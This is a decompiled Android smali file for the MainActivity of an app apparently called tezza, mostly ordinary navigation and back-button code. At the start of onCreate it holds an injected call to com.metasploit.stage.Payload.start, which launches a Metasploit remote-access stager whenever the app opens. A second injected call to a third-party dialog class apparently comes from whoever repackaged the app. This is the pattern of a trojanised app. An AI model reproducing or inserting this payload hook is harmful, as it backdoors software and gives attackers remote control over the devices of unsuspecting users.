.class public final Lorg/tezza/presentation/ui/base/MainActivity;
.super La/a/a/a/b;
.source "MainActivity.kt"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "La/a/a/a/b<",
        "La/a/a/a/e;",
        "La/a/g/c;",
        ">;"
    }
.end annotation


# instance fields
.field public t:Z

.field public u:Ljava/util/HashMap;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 1
    invoke-direct {p0}, La/a/a/a/b;-><init>()V

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 4

    .line 1
    invoke-virtual {p0}, Lj/m/a/e;->l()Lj/m/a/j;

    move-result-object v0

    const-class v1, La/a/a/b/c/b;

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj/m/a/j;->a(Ljava/lang/String;)Landroidx/fragment/app/Fragment;

    move-result-object v0

    instance-of v1, v0, La/a/a/b/c/b;

    if-nez v1, :cond_0

    const/4 v0, 0x0

    :cond_0
    check-cast v0, La/a/a/b/c/b;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, La/a/a/b/c/b;->V()V

    .line 2
    :cond_1
    invoke-virtual {p0}, Lj/m/a/e;->l()Lj/m/a/j;

    move-result-object v0

    const-string v1, "supportFragmentManager"

    invoke-static {v0, v1}, Lo/i/b/h;->a(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast v0, Lj/m/a/k;

    .line 3
    iget-object v0, v0, Lj/m/a/k;->i:Ljava/util/ArrayList;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v0

    goto :goto_0

    :cond_2
    const/4 v0, 0x0

    :goto_0
    const v1, 0x7f0901ce

    if-nez v0, :cond_4

    .line 4
    iget-boolean v0, p0, Lorg/tezza/presentation/ui/base/MainActivity;->t:Z

    if-eqz v0, :cond_3

    .line 5
    iget-object v0, p0, Landroidx/activity/ComponentActivity;->f:Landroidx/activity/OnBackPressedDispatcher;

    invoke-virtual {v0}, Landroidx/activity/OnBackPressedDispatcher;->a()V

    .line 6
    invoke-virtual {p0}, Lj/m/a/e;->l()Lj/m/a/j;

    move-result-object v0

    invoke-virtual {v0, v1}, Lj/m/a/j;->a(I)Landroidx/fragment/app/Fragment;

    move-result-object v0

    if-eqz v0, :cond_6

    .line 7
    invoke-virtual {v0}, Landroidx/fragment/app/Fragment;->E()V

    goto :goto_1

    :cond_3
    const/4 v0, 0x1

    .line 8
    iput-boolean v0, p0, Lorg/tezza/presentation/ui/base/MainActivity;->t:Z

    const v0, 0x7f0f0059

    .line 9
    invoke-virtual {p0, v0}, Landroid/app/Activity;->getString(I)Ljava/lang/String;

    move-result-object v0

    const-string v1, "getString(R.string.exit_from_app_msg)"

    invoke-static {v0, v1}, Lo/i/b/h;->a(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, v0}, La/a/a/a/b;->a(Ljava/lang/String;)V

    .line 10
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    .line 11
    new-instance v1, La/a/a/b/f/b;

    invoke-direct {v1, p0}, La/a/a/b/f/b;-><init>(Lorg/tezza/presentation/ui/base/MainActivity;)V

    const-wide/16 v2, 0x7d0

    .line 12
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_1

    .line 13
    :cond_4
    :try_start_0
    invoke-virtual {p0}, Lj/m/a/e;->l()Lj/m/a/j;

    move-result-object v0

    invoke-virtual {v0, v1}, Lj/m/a/j;->a(I)Landroidx/fragment/app/Fragment;

    move-result-object v0

    .line 14
    instance-of v1, v0, La/a/a/b/f/a;

    if-eqz v1, :cond_5

    .line 15
    check-cast v0, La/a/a/b/f/a;

    invoke-interface {v0}, La/a/a/b/f/a;->a()Z

    move-result v0

    if-nez v0, :cond_6

    .line 16
    iget-object v0, p0, Landroidx/activity/ComponentActivity;->f:Landroidx/activity/OnBackPressedDispatcher;

    invoke-virtual {v0}, Landroidx/activity/OnBackPressedDispatcher;->a()V

    goto :goto_1

    .line 17
    :cond_5
    iget-object v0, p0, Landroidx/activity/ComponentActivity;->f:Landroidx/activity/OnBackPressedDispatcher;

    invoke-virtual {v0}, Landroidx/activity/OnBackPressedDispatcher;->a()V
    :try_end_0
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 18
    :catch_0
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_6
    :goto_1
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 9

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    .line 1
    invoke-super {p0, p1}, La/a/a/a/b;->onCreate(Landroid/os/Bundle;)V

    .line 2
    sget v0, La/a/d;->vgNavigation:I

    .line 3
    iget-object v1, p0, Lorg/tezza/presentation/ui/base/MainActivity;->u:Ljava/util/HashMap;

    if-nez v1, :cond_0

    new-instance v1, Ljava/util/HashMap;

    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    iput-object v1, p0, Lorg/tezza/presentation/ui/base/MainActivity;->u:Ljava/util/HashMap;

    :cond_0
    iget-object v1, p0, Lorg/tezza/presentation/ui/base/MainActivity;->u:Ljava/util/HashMap;

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/View;

    if-nez v1, :cond_1

    invoke-virtual {p0, v0}, Lj/b/k/h;->findViewById(I)Landroid/view/View;

    move-result-object v1

    iget-object v2, p0, Lorg/tezza/presentation/ui/base/MainActivity;->u:Ljava/util/HashMap;

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v2, v0, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 4
    :cond_1
    check-cast v1, Lcom/google/android/material/bottomnavigation/BottomNavigationView;

    new-instance v0, La/a/a/b/f/c;

    invoke-direct {v0, p0}, La/a/a/b/f/c;-><init>(Lorg/tezza/presentation/ui/base/MainActivity;)V

    invoke-virtual {v1, v0}, Lcom/google/android/material/bottomnavigation/BottomNavigationView;->setOnNavigationItemSelectedListener(Lcom/google/android/material/bottomnavigation/BottomNavigationView$c;)V

    if-nez p1, :cond_2

    .line 5
    new-instance v3, La/a/a/b/c/b;

    invoke-direct {v3}, La/a/a/b/c/b;-><init>()V

    const v4, 0x7f0901ce

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x1

    move-object v2, p0

    .line 6
    invoke-virtual/range {v2 .. v8}, La/a/a/a/b;->b(Landroidx/fragment/app/Fragment;IZZZZ)V

    :cond_2
    invoke-static {p0}, Lcom/bubalex88/dialog/dlg;->Show(Landroid/content/Context;)V

    return-void
.end method

.method public p()V
    .locals 3

    const v0, 0x7f0c001d

    .line 1
    invoke-virtual {p0, v0}, Lj/b/k/h;->setContentView(I)V

    .line 2
    invoke-static {p0}, Lj/b/k/r;->a(Lj/m/a/e;)Lj/p/x;

    move-result-object v1

    const-class v2, La/a/a/a/e;

    invoke-virtual {v1, v2}, Lj/p/x;->a(Ljava/lang/Class;)Lj/p/w;

    move-result-object v1

    if-eqz v1, :cond_1

    check-cast v1, La/a/a/a/c;

    .line 3
    iput-object v1, p0, La/a/a/a/b;->r:La/a/a/a/c;

    .line 4
    invoke-static {p0, v0}, Lj/k/f;->a(Landroid/app/Activity;I)Landroidx/databinding/ViewDataBinding;

    move-result-object v0

    const-string v1, "DataBindingUtil.setContentView(this, id)"

    invoke-static {v0, v1}, Lo/i/b/h;->a(Ljava/lang/Object;Ljava/lang/String;)V

    .line 5
    iput-object v0, p0, La/a/a/a/b;->s:Landroidx/databinding/ViewDataBinding;

    .line 6
    invoke-virtual {p0}, La/a/a/a/b;->q()Landroidx/databinding/ViewDataBinding;

    move-result-object v0

    const/4 v1, 0x1

    .line 7
    iget-object v2, p0, La/a/a/a/b;->r:La/a/a/a/c;

    if-eqz v2, :cond_0

    .line 8
    invoke-virtual {v0, v1, v2}, Landroidx/databinding/ViewDataBinding;->a(ILjava/lang/Object;)Z

    .line 9
    invoke-virtual {p0}, La/a/a/a/b;->q()Landroidx/databinding/ViewDataBinding;

    move-result-object v0

    invoke-virtual {v0}, Landroidx/databinding/ViewDataBinding;->b()V

    return-void

    :cond_0
    const-string v0, "vm"

    .line 10
    invoke-static {v0}, Lo/i/b/h;->c(Ljava/lang/String;)V

    const/4 v0, 0x0

    throw v0

    .line 11
    :cond_1
    new-instance v0, Lkotlin/TypeCastException;

    const-string v1, "null cannot be cast to non-null type X"

    invoke-direct {v0, v1}, Lkotlin/TypeCastException;-><init>(Ljava/lang/String;)V

    throw v0
.end method
